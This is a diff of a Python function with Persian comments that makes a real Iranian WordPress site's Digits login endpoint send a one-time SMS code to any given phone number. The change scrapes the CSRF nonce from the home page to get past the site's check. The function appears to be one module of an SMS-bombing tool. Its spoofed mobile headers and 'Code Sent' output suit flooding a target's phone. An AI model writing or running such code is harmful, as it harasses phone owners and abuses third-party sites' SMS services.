@@ -48,71 +48,85 @@ def check_internet():
 # ------------------------------
 def hajamooo(phone):
     import requests
-    import string
-
+    import re
+    
     digits_phone = phone.replace("+98", "")
-    random_nounce = ''.join(random.choices(string.hexdigits.lower(), k=10))
-
-    url = "https://hajamooo.ir/wp-admin/admin-ajax.php"
-    payload = {
-        "action": "digits_check_mob",
-        "countrycode": "+98",
-        "mobileNo": digits_phone,
-        "csrf": random_nounce,
-        "login": "1",
-        "username": "",
-        "email": "",
-        "captcha": "",
-        "captcha_ses": "",
-        "digits": "1",
-        "json": "1",
-        "whatsapp": "0",
-        "mobmail": digits_phone,
-        "dig_otp": "",
-        "dig_nounce": random_nounce
-    }
-    headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        "Accept": "*/*",
-        "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "Origin": "https://hajamooo.ir",
-        "Referer": "https://hajamooo.ir/",
-        "X-Requested-With": "XMLHttpRequest"
-    }
-
+    
+    # مرحله 1: دریافت صفحه و استخراج nounce
     try:
-        response = requests.post(url, data=payload, headers=headers, timeout=10)
+        session = requests.Session()
         
-        # ابتدا نوع پاسخ را بررسی می‌کنیم
+        # اول صفحه اصلی را بگیریم تا cookieها تنظیم شوند
+        home_response = session.get("https://hajamooo.ir/", timeout=10)
+        
+        # استخراج nounce از صفحه - الگوهای مختلف را امتحان می‌کنیم
+        nounce_patterns = [
+            r'name="dig_nounce" value="([a-f0-9]+)"',
+            r'name="csrf" value="([a-f0-9]+)"',
+            r'"nonce":"([a-f0-9]+)"',
+            r'nonce=([a-f0-9]+)'
+        ]
+        
+        nounce_value = None
+        for pattern in nounce_patterns:
+            match = re.search(pattern, home_response.text)
+            if match:
+                nounce_value = match.group(1)
+                break
+        
+        # اگر nounce پیدا نشد، از مقدار تصادفی استفاده می‌کنیم
+        if not nounce_value:
+            import string
+            nounce_value = ''.join(random.choices(string.hexdigits.lower(), k=10))
+        
+        # مرحله 2: ارسال درخواست اصلی
+        url = "https://hajamooo.ir/wp-admin/admin-ajax.php"
+        payload = {
+            "action": "digits_check_mob",
+            "countrycode": "+98",
+            "mobileNo": digits_phone,
+            "csrf": nounce_value,
+            "login": "1",
+            "username": "",
+            "email": "",
+            "captcha": "",
+            "captcha_ses": "",
+            "digits": "1",
+            "json": "1",
+            "whatsapp": "0",
+            "mobmail": digits_phone,
+            "dig_otp": "",
+            "dig_nounce": nounce_value
+        }
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "X-Requested-With": "XMLHttpRequest",
+            "Referer": "https://hajamooo.ir/"
+        }
+        
+        response = session.post(url, data=payload, headers=headers, timeout=10)
+        
+        # پردازش پاسخ
         if response.status_code == 200:
-            try:
-                # سعی می‌کنیم پاسخ را به صورت JSON پردازش کنیم
-                response_data = response.json()
-                if isinstance(response_data, dict) and response_data.get("success") is True:
-                    print(f'{g}(hajamooo) {a}Code Sent')
-                    return True
-                else:
-                    error_msg = response_data.get("message", "Unknown error") if isinstance(response_data, dict) else str(response_data)
-                    print(f'{r}[-] (hajamooo) Failed: {error_msg}{a}')
-                    return False
-            except ValueError:
-                # اگر پاسخ JSON نبود، متن خام را بررسی می‌کنیم
-                response_text = response.text.strip()
-                if response_text == "1" or "success" in response_text.lower():
-                    print(f'{g}(hajamooo) {a}Code Sent')
-                    return True
-                else:
-                    print(f'{r}[-] (hajamooo) Failed: {response_text}{a}')
-                    return False
+            response_text = response.text.strip()
+            
+            if response_text == "1" or "success" in response_text.lower():
+                print(f'{g}(hajamooo) {a}Code Sent')
+                return True
+            else:
+                print(f'{r}[-] (hajamooo) Server Response: {response_text}{a}')
+                return False
         else:
             print(f'{r}[-] (hajamooo) HTTP Error: {response.status_code}{a}')
-            print(f'{r}[-] Response: {response.text}{a}')
             return False
-
+            
     except Exception as e:
         print(f'{r}[!] hajamooo Exception: {e}{a}')
         return False
+
+
 
 
 
